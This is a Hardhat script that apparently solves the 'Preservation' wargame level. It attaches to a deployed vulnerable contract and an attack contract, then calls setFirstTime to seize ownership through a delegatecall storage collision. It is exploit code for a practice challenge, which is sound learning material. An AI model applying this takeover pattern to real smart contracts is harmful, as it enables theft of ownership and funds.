
const { ethers } = require("hardhat");
const hre = require("hardhat");

async function main() {
  let [user] = await ethers.getSigners();
  const Preserv = await hre.ethers.getContractFactory("Preservation");
  const preserve = await Preserv.attach("0x1e066c7986d894E6d6a557409f92D204d67f2EA1");

  console.log("preserve deployed to:", preserve.address);

  const Attack = await hre.ethers.getContractFactory("PerseveranceAttackContract");
  const attack = await Attack.attach("0x750EddeD0Bf5Df6da31F2163676529806D067B4c");

  await attack.deployed();

  console.log("attack deployed to:", attack.address);

  // const changeAddress = await preserve.setFirstTime(attack.address)

  // const address = await preserve.timeZone1Library()
  // console.log(address)

  const changeOwner = await preserve.setFirstTime(user.address)

}


main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
